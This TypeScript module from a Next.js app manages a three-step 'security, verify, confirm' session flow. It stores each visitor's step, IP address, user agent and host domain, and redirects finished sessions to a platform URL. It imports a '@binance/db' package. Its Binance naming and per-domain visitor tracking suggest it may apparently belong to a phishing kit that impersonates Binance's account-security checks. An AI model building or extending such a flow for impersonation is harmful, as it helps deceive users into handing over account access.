import { headers } from "next/headers";
import type { SecuritySession } from "@binance/db";
import { getPlatform } from "./platform";
import prisma from "./prisma";

export type FlowStep = "security" | "verify" | "confirm";

const STEP_RANK: Record<FlowStep, number> = {
  security: 0,
  verify: 1,
  confirm: 2,
};

const STEP_ROUTE: Record<FlowStep, string> = {
  security: "/security",
  verify: "/security/verify",
  confirm: "/security/verify/confirm",
};

/**
 * Decide where a visitor should land given a session's saved progress.
 * Returns:
 *  - the platform redirectUrl when the session is finished (terminal state),
 *  - the resume URL when the user is further ahead than the requested page,
 *  - null to render the requested page.
 */
export function getFlowTarget(
  session: Pick<SecuritySession, "status" | "step" | "securityCode">,
  landing: FlowStep
): string | null {
  const { status, step, securityCode } = session;
  if (status === "completed" || status === "failed") {
    return getPlatform().redirectUrl;
  }
  const saved = step ?? "security";
  if (STEP_RANK[saved] > STEP_RANK[landing]) {
    return `${STEP_ROUTE[saved]}?security_code=${securityCode}`;
  }
  return null;
}

/**
 * Bump the saved step forward (never backward) and stamp the visit with the
 * request metadata. First-seen ip/userAgent/domain are kept.
 */
export async function recordFlowStep(
  sessionId: string,
  landing: FlowStep,
  meta: { ipAddress: string | null; userAgent: string | null; domain: string | null }
): Promise<void> {
  const session = await prisma.securitySession.findUnique({
    where: { id: sessionId },
  });
  if (!session) return;

  const current = session.step ? STEP_RANK[session.step] : -1;
  const step = STEP_RANK[landing] > current ? landing : session.step;

  await prisma.securitySession.update({
    where: { id: sessionId },
    data: {
      step,
      lastVisitedAt: new Date(),
      ipAddress: session.ipAddress ?? meta.ipAddress,
      userAgent: session.userAgent ?? meta.userAgent,
      domain: session.domain ?? meta.domain,
    },
  });
}

export async function getRequestMeta() {
  const h = await headers();
  return {
    ipAddress: h.get("x-forwarded-for") || h.get("remote-addr"),
    userAgent: h.get("user-agent"),
    domain: h.get("host"),
  };
}